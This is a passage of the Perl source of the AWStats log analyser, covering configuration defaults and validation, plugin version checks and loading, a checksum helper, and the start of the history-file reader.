$ShowHTTPErrorsStats !~ /[01]/ )    { $ShowHTTPErrorsStats = 1; }\n\tif ( $ShowHTTPErrorsPageDetail !~ /[RH]/ ) { $ShowHTTPErrorsPageDetail = 'R'; }\n\tif ( $ShowSMTPErrorsStats !~ /[01]/ )    { $ShowSMTPErrorsStats = 0; }\n\tif ( $AddDataArrayMonthStats !~ /[01]/ ) { $AddDataArrayMonthStats = 1; }\n\n\tif ( $AddDataArrayShowDaysOfMonthStats !~ /[01]/ ) {\n\t\t$AddDataArrayShowDaysOfMonthStats = 1;\n\t}\n\tif ( $AddDataArrayShowDaysOfWeekStats !~ /[01]/ ) {\n\t\t$AddDataArrayShowDaysOfWeekStats = 1;\n\t}\n\tif ( $AddDataArrayShowHoursStats !~ /[01]/ ) {\n\t\t$AddDataArrayShowHoursStats = 1;\n\t}\n\tmy @maxnboflist = (\n\t\t'Domain',           'HostsShown',\n\t\t'LoginShown',       'RobotShown',\n\t\t'WormsShown',       'PageShown',\n\t\t'OsShown',          'BrowsersShown',\n\t\t'ScreenSizesShown', 'RefererShown',\n\t\t'KeyphrasesShown',  'KeywordsShown',\n\t\t'EMailsShown',\t\t'DownloadsShown'\n\t);\n\tmy @maxnboflistdefaultval =\n\t  ( 10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20 );\n\tforeach my $i ( 0 .. ( @maxnboflist - 1 ) ) {\n\t\tif (   !$MaxNbOf{ $maxnboflist[$i] }\n\t\t\t|| $MaxNbOf{ $maxnboflist[$i] } !~ /^\\d+$/\n\t\t\t|| $MaxNbOf{ $maxnboflist[$i] } < 1 )\n\t\t{\n\t\t\t$MaxNbOf{ $maxnboflist[$i] } = $maxnboflistdefaultval[$i];\n\t\t}\n\t}\n\tmy @minhitlist = (\n\t\t'Domain',     'Host',  'Login',     'Robot',\n\t\t'Worm',       'File',  'Os',        'Browser',\n\t\t'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',\n\t\t'EMail',\t  'Downloads'\n\t);\n\tmy @minhitlistdefaultval = ( 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );\n\tforeach my $i ( 0 .. ( @minhitlist - 1 ) ) {\n\t\tif (   !$MinHit{ $minhitlist[$i] }\n\t\t\t|| $MinHit{ $minhitlist[$i] } !~ /^\\d+$/\n\t\t\t|| $MinHit{ $minhitlist[$i] } < 1 )\n\t\t{\n\t\t\t$MinHit{ $minhitlist[$i] } = $minhitlistdefaultval[$i];\n\t\t}\n\t}\n\tif ( $FirstDayOfWeek !~ /[01]/ )   { $FirstDayOfWeek   = 1; }\n\tif ( $UseFramesWhenCGI !~ /[01]/ ) { $UseFramesWhenCGI = 1; }\n\tif ( $DetailedReportsOnNewWindows !~ /[012]/ ) {\n\t\t$DetailedReportsOnNewWindows = 1;\n\t}\n\tif ( $ShowLinksOnUrl !~ /[01]/ ) { $ShowLinksOnUrl = 1; }\n\tif ( $MaxLengthOfShownURL !~ /^\\d+/ || $MaxLengthOfShownURL < 1 ) {\n\t\t$MaxLengthOfShownURL = 64;\n\t}\n\tif ( $ShowLinksToWhoIs !~ /[01]/ ) { $ShowLinksToWhoIs = 0; }\n\t$Logo     ||= 'awstats_logo6.png';\n\t$LogoLink ||= 'http://www.awstats.org';\n\tif ( $BarWidth !~ /^\\d+/  || $BarWidth < 1 )  { $BarWidth  = 260; }\n\tif ( $BarHeight !~ /^\\d+/ || $BarHeight < 1 ) { $BarHeight = 90; }\n\t$color_Background =~ s/#//g;\n\tif ( $color_Background !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_Background = 'FFFFFF';\n\t}\n\t$color_TableBGTitle =~ s/#//g;\n\n\tif ( $color_TableBGTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableBGTitle = 'CCCCDD';\n\t}\n\t$color_TableTitle =~ s/#//g;\n\tif ( $color_TableTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableTitle = '000000';\n\t}\n\t$color_TableBG =~ s/#//g;\n\tif ( $color_TableBG !~ /^[0-9|A-H]+$/i ) { $color_TableBG = 'CCCCDD'; }\n\t$color_TableRowTitle =~ s/#//g;\n\tif ( $color_TableRowTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableRowTitle = 'FFFFFF';\n\t}\n\t$color_TableBGRowTitle =~ s/#//g;\n\tif ( $color_TableBGRowTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableBGRowTitle = 'ECECEC';\n\t}\n\t$color_TableBorder =~ s/#//g;\n\tif ( $color_TableBorder !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableBorder = 'ECECEC';\n\t}\n\t$color_text =~ s/#//g;\n\tif ( $color_text !~ /^[0-9|A-H]+$/i ) { $color_text = '000000'; }\n\t$color_textpercent =~ s/#//g;\n\tif ( $color_textpercent !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_textpercent = '606060';\n\t}\n\t$color_titletext =~ s/#//g;\n\tif ( $color_titletext !~ /^[0-9|A-H]+$/i ) { $color_titletext = '000000'; }\n\t$color_weekend =~ s/#//g;\n\tif ( $color_weekend !~ /^[0-9|A-H]+$/i ) { $color_weekend = 'EAEAEA'; }\n\t$color_link =~ s/#//g;\n\tif ( $color_link !~ /^[0-9|A-H]+$/i ) { $color_link = '0011BB'; }\n\t$color_hover =~ s/#//g;\n\tif ( $color_hover !~ /^[0-9|A-H]+$/i ) { $color_hover = '605040'; }\n\t$color_other =~ s/#//g;\n\tif ( $color_other !~ /^[0-9|A-H]+$/i ) { $color_other = '666688'; }\n\t$color_u =~ s/#//g;\n\tif ( $color_u !~ /^[0-9|A-H]+$/i ) { $color_u = 'FFA060'; }\n\t$color_v =~ s/#//g;\n\tif ( $color_v !~ /^[0-9|A-H]+$/i ) { $color_v = 'F4F090'; }\n\t$color_p =~ s/#//g;\n\tif ( $color_p !~ /^[0-9|A-H]+$/i ) { $color_p = '4477DD'; }\n\t$color_h =~ s/#//g;\n\tif ( $color_h !~ /^[0-9|A-H]+$/i ) { $color_h = '66EEFF'; }\n\t$color_k =~ s/#//g;\n\tif ( $color_k !~ /^[0-9|A-H]+$/i ) { $color_k = '2EA495'; }\n\t$color_s =~ s/#//g;\n\tif ( $color_s !~ /^[0-9|A-H]+$/i ) { $color_s = '8888DD'; }\n\t$color_e =~ s/#//g;\n\tif ( $color_e !~ /^[0-9|A-H]+$/i ) { $color_e = 'CEC2E8'; }\n\t$color_x =~ s/#//g;\n\tif ( $color_x !~ /^[0-9|A-H]+$/i ) { $color_x = 'C1B2E2'; }\n\n\t# Correct param if default value is asked\n\tif ( $ShowSummary            eq '1' ) { $ShowSummary            = 'UVPHB'; }\n\tif ( $ShowMonthStats         eq '1' ) { $ShowMonthStats         = 'UVPHB'; }\n\tif ( $ShowDaysOfMonthStats   eq '1' ) { $ShowDaysOfMonthStats   = 'VPHB'; }\n\tif ( $ShowDaysOfWeekStats    eq '1' ) { $ShowDaysOfWeekStats    = 'PHBL'; }\n\tif ( $ShowHoursStats         eq '1' ) { $ShowHoursStats         = 'PHBL'; }\n\tif ( $ShowDomainsStats       eq '1' ) { $ShowDomainsStats       = 'PHB'; }\n\tif ( $ShowHostsStats         eq '1' ) { $ShowHostsStats         = 'PHBL'; }\n\tif ( $ShowEMailSenders       eq '1' ) { $ShowEMailSenders       = 'HBML'; }\n\tif ( $ShowEMailReceivers     eq '1' ) { $ShowEMailReceivers     = 'HBML'; }\n\tif ( $ShowAuthenticatedUsers eq '1' ) { $ShowAuthenticatedUsers = 'PHBL'; }\n\tif ( $ShowRobotsStats        eq '1' ) { $ShowRobotsStats        = 'HBL'; }\n\tif ( $ShowWormsStats         eq '1' ) { $ShowWormsStats         = 'HBL'; }\n\tif ( $ShowPagesStats         eq '1' ) { $ShowPagesStats         = 'PBEX'; }\n\tif ( $ShowFileTypesStats     eq '1' ) { $ShowFileTypesStats     = 'HB'; }\n\tif ( $ShowDownloadsStats     eq '1' ) { $ShowDownloadsStats     = 'HB';}\n\tif ( $ShowOriginStats        eq '1' ) { $ShowOriginStats        = 'PH'; }\n\tif ( $ShowClusterStats       eq '1' ) { $ShowClusterStats       = 'PHB'; }\n\tif ( $ShowMiscStats eq '1' ) { $ShowMiscStats = 'anjdfrqwp'; }\n\n# Convert extra sections data into @ExtraConditionType, @ExtraConditionTypeVal...\n\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\tmy $part = 0;\n\t\tforeach my $conditioncouple (\n\t\t\tsplit( /\\s*\\|\\|\\s*/, $ExtraCondition[$extranum] ) )\n\t\t{\n\t\t\tmy ( $conditiontype, $conditiontypeval ) =\n\t\t\t  split( /[,:]/, $conditioncouple, 2 );\n\t\t\t$ExtraConditionType[$extranum][$part] = $conditiontype;\n\t\t\tif ( $conditiontypeval =~ /^REGEX\\[(.*)\\]$/i ) {\n\t\t\t\t$conditiontypeval = $1;\n\t\t\t}\n\n\t\t\t#else { $conditiontypeval=quotemeta($conditiontypeval); }\n\t\t\t$ExtraConditionTypeVal[$extranum][$part] = qr/$conditiontypeval/i;\n\t\t\t$part++;\n\t\t}\n\t\t$part = 0;\n\t\tforeach my $rowkeycouple (\n\t\t\tsplit( /\\s*\\|\\|\\s*/, $ExtraFirstColumnValues[$extranum] ) )\n\t\t{\n\t\t\tmy ( $rowkeytype, $rowkeytypeval ) =\n\t\t\t  split( /[,:]/, $rowkeycouple, 2 );\n\t\t\t$ExtraFirstColumnValuesType[$extranum][$part] = $rowkeytype;\n\t\t\tif ( $rowkeytypeval =~ /^REGEX\\[(.*)\\]$/i ) { $rowkeytypeval = $1; }\n\n\t\t\t#else { $rowkeytypeval=quotemeta($rowkeytypeval); }\n\t\t\t$ExtraFirstColumnValuesTypeVal[$extranum][$part] =\n\t\t\t  qr/$rowkeytypeval/i;\n\t\t\t$part++;\n\t\t}\n\t}\n\n\t# Show definitive value for major parameters\n\tif ($Debug) {\n\t\tdebug( \" LogFile='$LogFile'\",               2 );\n\t\tdebug( \" LogFormat='$LogFormat'\",           2 );\n\t\tdebug( \" LogSeparator='$LogSeparator'\",     2 );\n\t\tdebug( \" DNSLookup='$DNSLookup'\",           2 );\n\t\tdebug( \" DirData='$DirData'\",               2 );\n\t\tdebug( \" DirCgi='$DirCgi'\",                 2 );\n\t\tdebug( \" DirIcons='$DirIcons'\",             2 );\n\t\tdebug( \" SiteDomain='$SiteDomain'\",         2 );\n\t\tdebug( \" MiscTrackerUrl='$MiscTrackerUrl'\", 2 );\n\t\tforeach ( keys %MaxNbOf ) { debug( \" MaxNbOf{$_}=$MaxNbOf{$_}\", 2 ); }\n\t\tforeach ( keys %MinHit )  { debug( \" MinHit{$_}=$MinHit{$_}\",   2 ); }\n\n\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\tdebug(\n\t\t\t\t\" ExtraCodeFilter[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraCodeFilter[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraConditionType[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraConditionType[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraConditionTypeVal[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraFirstColumnFunction[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraFirstColumnValuesType[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraFirstColumnValuesTypeVal[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t}\n\n# Deny URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters both set\n\tif ( @URLWithQueryWithOnly && @URLWithQueryWithout ) {\n\t\terror(\n\"URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time\"\n\t\t);\n\t}\n\n\t# Deny $ShowHTTPErrorsStats and $ShowSMTPErrorsStats both set\n\tif ( $ShowHTTPErrorsStats && $ShowSMTPErrorsStats ) {\n\t\terror(\n\"ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time\"\n\t\t);\n\t}\n\n  # Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on\n\tif ( ( $PurgeLogFile || $ArchiveLogRecords ) && $LogFile =~ /\\|\\s*$/ ) {\n\t\terror(\n\"A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0\"\n\t\t);\n\t}\n\n\t# If not a migrate, check if DirData is OK\n\tif ( !$MigrateStats && !-d $DirData ) {\n\t\tif ($CreateDirDataIfNotExists) {\n\t\t\tif ($Debug) { debug( \" Make directory $DirData\", 2 ); }\n\t\t\tmy $mkdirok = mkdir \"$DirData\", 0766;\n\t\t\tif ( !$mkdirok ) {\n\t\t\t\terror(\n\"$PROG failed to create directory DirData (DirData=\\\"$DirData\\\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists).\"\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\terror(\n\"AWStats database directory defined in config file by 'DirData' parameter ($DirData) does not exist or is not writable.\"\n\t\t\t);\n\t\t}\n\t}\n\n\tif ( $LogType eq 'S' ) { $NOTSORTEDRECORDTOLERANCE = 1000000; }\n}\n\n#------------------------------------------------------------------------------\n# Function:     Common function used by init function of plugins\n# Parameters:\tAWStats version required by plugin\n# Input:\t\t$VERSION\n# Output:\t\tNone\n# Return: \t\t'' if ok, \"Error: xxx\" if error\n#------------------------------------------------------------------------------\nsub Check_Plugin_Version {\n\tmy $PluginNeedAWStatsVersion = shift;\n\tif ( !$PluginNeedAWStatsVersion ) { return 0; }\n\t$VERSION =~ /^(\\d+)\\.(\\d+)/;\n\tmy $numAWStatsVersion = ( $1 * 1000 ) + $2;\n\t$PluginNeedAWStatsVersion =~ /^(\\d+)\\.(\\d+)/;\n\tmy $numPluginNeedAWStatsVersion = ( $1 * 1000 ) + $2;\n\tif ( $numPluginNeedAWStatsVersion > $numAWStatsVersion ) {\n\t\treturn\n\"Error: AWStats version $PluginNeedAWStatsVersion or higher is required. Detected $VERSION.\";\n\t}\n\treturn '';\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return a checksum for an array of string\n# Parameters:\tArray of string\n# Input:\t\tNone\n# Output:\t\tNone\n# Return: \t\tChecksum number\n#------------------------------------------------------------------------------\nsub CheckSum {\n\tmy $string   = shift;\n\tmy $checksum = 0;\n\n\t#\tuse MD5;\n\t# \t$checksum = MD5->hexhash($string);\n\tmy $i = 0;\n\tmy $j = 0;\n\twhile ( $i < length($string) ) {\n\t\tmy $c = substr( $string, $i, 1 );\n\t\t$checksum += ( ord($c) << ( 8 * $j ) );\n\t\tif ( $j++ > 3 ) { $j = 0; }\n\t\t$i++;\n\t}\n\treturn $checksum;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Load plugins files\n# Parameters:\tNone\n# Input:\t\t$DIR @PluginsToLoad\n# Output:\t\tNone\n# Return: \t\tNone\n#------------------------------------------------------------------------------\nsub Read_Plugins {\n\n# Check plugin files in common possible directories :\n# Windows and standard package:        \t\t\"$DIR/plugins\" (plugins in same dir than awstats.pl)\n# Redhat :                                  \"/usr/local/awstats/wwwroot/cgi-bin/plugins\"\n# Debian package :                    \t\t\"/usr/share/awstats/plugins\"\n\tmy @PossiblePluginsDir = (\n\t\t\"$DIR/plugins\",\n\t\t\"/usr/local/awstats/wwwroot/cgi-bin/plugins\",\n\t\t\"/usr/share/awstats/plugins\"\n\t);\n\tmy %DirAddedInINC = ();\n\n#Removed for security reason\n#foreach my $key (keys %NoLoadPlugin) { if ($NoLoadPlugin{$key} < 0) { push @PluginsToLoad, $key; } }\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"Call to Read_Plugins with list: \" . join( ',', @PluginsToLoad ) );\n\t}\n\tforeach my $plugininfo (@PluginsToLoad) {\n\t\tmy ( $pluginfile, $pluginparam ) = split( /\\s+/, $plugininfo, 2 );\n\t\t$pluginparam ||=\n\t\t  \"\";    # If split has only on part, pluginparam is not initialized\n        $pluginfile =~ s/\\.pm$//i;\n\t\t$pluginfile =~ /([^\\/\\\\]+)$/;\n\t\t$pluginfile = Sanitize($1);     # pluginfile is cleaned from any path for security reasons and from .pm\n\t\tmy $pluginname = $pluginfile;\n\t\tif ( $NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0 ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" Plugin load for '$pluginfile' has been disabled from parameters\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ($pluginname) {\n\t\t\tif ( !$PluginsLoaded{'init'}{\"$pluginname\"} )\n\t\t\t{                   # Plugin not already loaded\n\t\t\t\tmy %pluginisfor = (\n\t\t\t\t\t'timehires'            => 'u',\n\t\t\t\t\t'ipv6'                 => 'u',\n\t\t\t\t\t'hashfiles'            => 'u',\n\t\t\t\t\t'geoipfree'            => 'u',\n\t\t\t\t\t'geoip'                => 'ou',\n\t\t\t\t\t'geoip6'               => 'ou',\n\t\t\t\t\t'geoip_region_maxmind' => 'mou',\n\t\t\t\t\t'geoip_city_maxmind'   => 'mou',\n\t\t\t\t\t'geoip_isp_maxmind'    => 'mou',\n\t\t\t\t\t'geoip_org_maxmind'    => 'mou',\n\t\t\t\t\t'timezone'             => 'ou',\n\t\t\t\t\t'decodeutfkeys'        => 'o',\n\t\t\t\t\t'hostinfo'             => 'o',\n\t\t\t\t\t'rawlog'               => 'o',\n\t\t\t\t\t'userinfo'             => 'o',\n\t\t\t\t\t'urlalias'             => 'o',\n\t\t\t\t\t'tooltips'             => 'o'\n\t\t\t\t);\n\t\t\t\tif ( $pluginisfor{$pluginname} )\n\t\t\t\t{    # If it's a known plugin, may be we don't need to load it\n\t\t\t\t\t # Do not load \"menu handler plugins\" if output only and mainleft frame\n\t\t\t\t\tif (   !$UpdateStats\n\t\t\t\t\t\t&& scalar keys %HTMLOutput\n\t\t\t\t\t\t&& $FrameName eq 'mainleft'\n\t\t\t\t\t\t&& $pluginisfor{$pluginname} !~ /m/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tnext;\n\t\t\t\t\t}\n\n\t\t\t\t\t# Do not load \"update plugins\" if output only\n\t\t\t\t\tif (   !$UpdateStats\n\t\t\t\t\t\t&& scalar keys %HTMLOutput\n\t\t\t\t\t\t&& $pluginisfor{$pluginname} !~ /o/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tnext;\n\t\t\t\t\t}\n\n\t\t\t\t\t# Do not load \"output plugins\" if update only\n\t\t\t\t\tif (   $UpdateStats\n\t\t\t\t\t\t&& !scalar keys %HTMLOutput\n\t\t\t\t\t\t&& $pluginisfor{$pluginname} !~ /u/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tnext;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t# Load plugin\n\t\t\t\tforeach my $dir (@PossiblePluginsDir) {\n\t\t\t\t\tmy $searchdir = $dir;\n\t\t\t\t\tif (   $searchdir\n\t\t\t\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t\t\t\t{\n\t\t\t\t\t\t$searchdir .= \"/\";\n\t\t\t\t\t}\n\t\t\t\t\tmy $pluginpath = \"${searchdir}${pluginfile}.pm\";\n\t\t\t\t\tif ( -s \"$pluginpath\" ) {\n\t\t\t\t\t\t$PluginDir = \"${searchdir}\";    # Set plugin dir\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\" Try to init plugin '$pluginname' ($pluginpath) with param '$pluginparam'\",\n\t\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$DirAddedInINC{\"$dir\"} ) {\n\t\t\t\t\t\t\tpush @INC, \"$dir\";\n\t\t\t\t\t\t\t$DirAddedInINC{\"$dir\"} = 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmy $loadret = 0;\n\t\t\t\t\t\tmy $modperl = $ENV{\"MOD_PERL\"}\n\t\t\t\t\t\t  ? eval {\n\t\t\t\t\t\t\trequire mod_perl;\n\t\t\t\t\t\t\t$mod_perl::VERSION >= 1.99 ? 2 : 1;\n\t\t\t\t\t\t  }\n\t\t\t\t\t\t  : 0;\n\t\t\t\t\t\tif ( $modperl == 2 ) {\n\t\t\t\t\t\t\t$loadret = require \"$pluginpath\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse { $loadret = require \"$pluginfile.pm\"; }\n\t\t\t\t\t\tif ( !$loadret || $loadret =~ /^error/i ) {\n\n\t\t\t\t\t\t\t# Load failed, we stop here\n\t\t\t\t\t\t\terror(\n\"Plugin load for plugin '$pluginname' failed with return code: $loadret\"\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmy $ret;    # To get init return\n\t\t\t\t\t\tmy $initfunction =\n\t\t\t\t\t\t  \"\\$ret=Init_$pluginname('$pluginparam')\";\t\t# Note that pluginname and pluginparam were sanitized when reading cong file entry 'LoadPlugin'\n\t\t\t\t\t\tmy $initret = eval(\"$initfunction\");\n\t\t\t\t\t\tif ( $initret && $initret eq 'xxx' ) {\n\t\t\t\t\t\t\t$initret =\n'Error: The PluginHooksFunctions variable defined in plugin file does not contain list of hooked functions';\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$initret || $initret =~ /^error/i ) {\n\n\t\t\t\t\t\t\t# Init function failed, we stop here\n\t\t\t\t\t\t\terror(\n\"Plugin init for plugin '$pluginname' failed with return code: \"\n\t\t\t\t\t\t\t\t  . (\n\t\t\t\t\t\t\t\t\t$initret\n\t\t\t\t\t\t\t\t\t? \"$initret\"\n\t\t\t\t\t\t\t\t\t: \"$@ (A module required by plugin might be missing).\"\n\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Plugin load and init successful\n\t\t\t\t\t\tforeach my $elem ( split( /\\s+/, $initret ) ) {\n\n\t\t\t\t\t\t\t# Some functions can only be plugged once\n\t\t\t\t\t\t\tmy @uniquefunc = (\n\t\t\t\t\t\t\t\t'GetCountryCodeByName',\n\t\t\t\t\t\t\t\t'GetCountryCodeByAddr',\n\t\t\t\t\t\t\t\t'ChangeTime',\n\t\t\t\t\t\t\t\t'GetTimeZoneTitle',\n\t\t\t\t\t\t\t\t'GetTime',\n\t\t\t\t\t\t\t\t'SearchFile',\n\t\t\t\t\t\t\t\t'LoadCache',\n\t\t\t\t\t\t\t\t'SaveHash',\n\t\t\t\t\t\t\t\t'ShowMenu'\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tmy $isuniquefunc = 0;\n\t\t\t\t\t\t\tforeach my $function (@uniquefunc) {\n\t\t\t\t\t\t\t\tif ( \"$elem\" eq \"$function\" ) {\n\n\t# We try to load a 'unique' function, so we check and stop if already loaded\n\t\t\t\t\t\t\t\t\tforeach my $otherpluginname (\n\t\t\t\t\t\t\t\t\t\tkeys %{ $PluginsLoaded{\"$elem\"} } )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\terror(\n\"Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\\nYou must choose between one of them. Using together is not possible.\"\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t$isuniquefunc = 1;\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($isuniquefunc) {\n\n\t\t\t   # TODO Use $PluginsLoaded{\"$elem\"}=\"$pluginname\"; for unique func\n\t\t\t\t\t\t\t\t$PluginsLoaded{\"$elem\"}{\"$pluginname\"} = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse { $PluginsLoaded{\"$elem\"}{\"$pluginname\"} = 1; }\n\t\t\t\t\t\t\tif ( \"$elem\" =~ /SectionInitHashArray/ ) {\n\t\t\t\t\t\t\t\t$AtLeastOneSectionPlugin = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\" Plugin '$pluginname' now hooks functions '$initret'\",\n\t\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !$PluginsLoaded{'init'}{\"$pluginname\"} ) {\n\t\t\t\t\terror(\n\"AWStats config file contains a directive to load plugin \\\"$pluginname\\\" (LoadPlugin=\\\"$plugininfo\\\") but AWStats can't open plugin file \\\"$pluginfile.pm\\\" for read.\\nCheck if file is in \\\"\"\n\t\t\t\t\t\t  . ( $PossiblePluginsDir[0] )\n\t\t\t\t\t\t  . \"\\\" directory and is readable.\" );\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\twarning(\n\"Warning: Tried to load plugin \\\"$pluginname\\\" twice. Fix config file.\"\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\terror(\"Plugin \\\"$pluginfile\\\" is not a valid plugin name.\");\n\t\t}\n\t}\n\n# In output mode, geo ip plugins are not loaded, so message changes are done here (can't be done in plugin init function)\n\tif (   $PluginsLoaded{'init'}{'geoip'}\n\t\t|| $PluginsLoaded{'init'}{'geoip6'}\n\t\t|| $PluginsLoaded{'init'}{'geoipfree'} )\n\t{\n\t\t$Message[17] = $Message[25] = $Message[148];\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tRead history file and create or update tmp history file\n# Parameters:\tyear,month,day,hour,withupdate,withpurge,part_to_load[,lastlinenb,lastlineoffset,lastlinechecksum]\n# Input:\t\t$DirData $PROG $FileSuffix $LastLine $DatabaseBreak\n# Output:\t\tNone\n# Return:\t\tTmp history file name created/updated or '' if withupdate is 0\n#------------------------------------------------------------------------------\nsub Read_History_With_TmpUpdate {\n\n\tmy $year  = sprintf( \"%04i\", shift || 0 );\n\tmy $month = sprintf( \"%02i\", shift || 0 );\n\tmy $day   = shift;\n\tif ( $day ne '' ) { $day = sprintf( \"%02i\", $day ); }\n\tmy $hour = shift;\n\tif ( $hour ne '' ) { $hour = sprintf( \"%02i\", $hour ); }\n\tmy $withupdate = shift || 0;\n\tmy $withpurge  = shift || 0;\n\tmy $part       = shift || '';\n\n\tmy ( $date, $filedate ) = ( '', '' );\n\tif ( $DatabaseBreak eq 'month' ) {\n\t\t$date     = sprintf( \"%04i%02i\", $year,  $month );\n\t\t$filedate = sprintf( \"%02i%04i\", $month, $year );\n\t}\n\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t$date     = sprintf( \"%04i%\", $year );\n\t\t$filedate = sprintf( \"%04i\",  $year );\n\t}\n\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t$date     = sprintf( \"%04i%02i%02i\", $year,  $month, $day );\n\t\t$filedate = sprintf( \"%02i%04i%02i\", $month, $year,  $day );\n\t}\n\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t$date     = sprintf( \"%04i%02i%02i%02i\", $year,  $month, $day, $hour );\n\t\t$filedate = sprintf( \"%02i%04i%02i%02i\", $month, $year,  $day, $hour );\n\t}\n\n\tmy $xml   = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );\n\tmy $xmleb = '</table><nu>';\n\tmy $xmlrb = '<tr><td>';\n\n\tmy $lastlinenb       = shift || 0;\n\tmy $lastlineoffset   = shift || 0;\n\tmy $lastlinechecksum = shift || 0;\n\n\tmy %allsections = (\n\t\t'general'               => 1,\n\t\t'misc'                  => 2,\n\t\t'time'                  => 3,\n\t\t'visitor'               => 4,\n\t\t'day'                   => 5,\n\t\t'domain'                => 6,\n\t\t'cluster'               => 7,\n\t\t'login'                 => 8,\n\t\t'robot'                 => 9,\n\t\t'worms'                 => 10,\n\t\t'emailsender'           => 11,\n\t\t'emailreceiver'         => 12,\n\t\t'session'               => 13,\n\t\t'sider'                 => 14,\n\t\t'filetypes'             => 15,\n\t\t'downloads'\t\t\t\t=> 16,\n\t\t'os'                    => 17,\n\t\t'browser'               => 18,\n\t\t'screensize'            => 19,\n\t\t'unknownreferer'        => 20,\n\t\t'unknownrefererbrowser' => 21,\n\t\t'origin'                => 22,\n\t\t'sereferrals'           => 23,\n\t\t'pagerefs'              => 24,\n\t\t'searchwords'           => 25,\n\t\t'keywords'              => 26,\n\t\t'errors'                => 27,\n\t);\n\n\tmy $order = ( scalar keys %allsections ) + 1;\n\tforeach ( keys %TrapInfosForHTTPErrorCodes ) 